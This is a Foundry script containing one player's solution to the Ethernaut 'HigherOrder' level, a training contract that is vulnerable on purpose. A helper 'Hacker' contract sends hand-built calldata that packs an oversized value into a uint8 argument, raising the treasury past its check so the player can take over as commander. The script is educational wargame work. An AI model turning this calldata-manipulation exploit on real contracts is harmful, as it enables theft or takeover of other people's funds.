// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Challenge Contract Interface)
////////////////////////////////////////////////////////////////////////////////////
// Use import will introduce `incompatible Solidity versions` error
interface HigherOrder {
    function registerTreasury(uint8 value) external; // Function to register treasury

    function claimLeadership() external; // Function to claim leadership

    // Getter functions for commander and treasury
    function commander() external view returns (address); // Getter for commander

    function treasury() external view returns (uint256); // Getter for treasury
}

////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Challenge Contract Interface)
////////////////////////////////////////////////////////////////////////////////////

contract HigherOrderSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xd459773f02e53F6e91b0f766e42E495aEf26088F;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Hacker contract;
        Hacker hacker = new Hacker(challengeInstance);

        // Step 2: Call `hackTreasury()` function of the Hacker contract;
        hacker.hackTreasury();

        // Step 3: Call `claimLeadership()` function of the HigherOrder contract;
        HigherOrder higherOrder = HigherOrder(challengeInstance);
        higherOrder.claimLeadership();

        // Step 4: Confirm that `commander` of the HigherOrder contract is now `heroAddress`.
        address heroAddress = vm.addr(heroPrivateKey);
        require(
            higherOrder.commander() == heroAddress,
            "HigherOrder commander check failed"
        );

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(29));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Hacker {
    address addrHigherOrder;

    constructor(address targetAddress) {
        addrHigherOrder = targetAddress;
    }

    function hackTreasury() external {
        // Example value for the uint8 argument
        uint8 argumentValue = 5; // This will be the uint8 part, which is <= 255
        uint256 additionalValue = 300; // This will be added to the padding

        // Create a bytes32 value to pass as calldata
        bytes32 paddedValue = bytes32(
            uint256(argumentValue) | (additionalValue << 8)
        );

        // Calculate the function selector for registerTreasury()
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));

        // Use low-level call to invoke registerTreasury
        (bool success, ) = addrHigherOrder.call(
            abi.encodeWithSelector(selector, paddedValue)
        );

        require(success, "Call to registerTreasury failed");
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
